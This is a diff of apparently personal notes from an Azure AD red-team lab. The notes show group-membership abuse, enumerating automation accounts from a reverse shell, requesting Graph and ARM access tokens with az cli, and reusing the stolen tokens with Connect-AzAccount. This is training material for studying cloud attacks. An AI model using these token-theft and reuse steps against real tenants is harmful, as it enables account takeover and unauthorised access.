@@ -682,7 +682,7 @@ New-MgGroupMemberByRef -GroupId e6870783-1378-4078-b242-84c08c6dc0d7 -BodyParame
 ```
 Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 -RefObjectId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3 -Verbose
 ```
-#### back on shell to enum resources
+#### back on shell steal both tokens to enum resources
 - Now moving back to the shell, and having added Mark to the group, we should be able to enum resources i.e., Automation Accounts
 - Now, we can use az cli to check for automation accounts. Run the below command on the reverse shell:
 ```az automation account list```
@@ -695,10 +695,10 @@ Add-AzureADGroupMember -ObjectId e6870783-1378-4078-b242-84c08c6dc0d7 -RefObject
  - To request an access token for add-graph:
 ```az account get-access-token --resource-type aad-graph```
 
-Use the below command for using both the tokens with Az PowerShell on student VM: 
+- Back on the STUDENT VM Use the below command for using both the tokens with Az PowerShell on student VM: 
 ```
-PS C:\AzAD\Tools> $AADToken = 'eyJ0…'
 PS C:\AzAD\Tools> $AccessToken = 'eyJ0…'
+PS C:\AzAD\Tools> $AADToken = 'eyJ0…'
 
 PS C:\AzAD\Tools> Connect-AzAccount -AccessToken $AccessToken -GraphAccessToken $AADToken -AccountId f66e133c-bd01-4b0b-b3b7-7cd949fd45f3
 ```
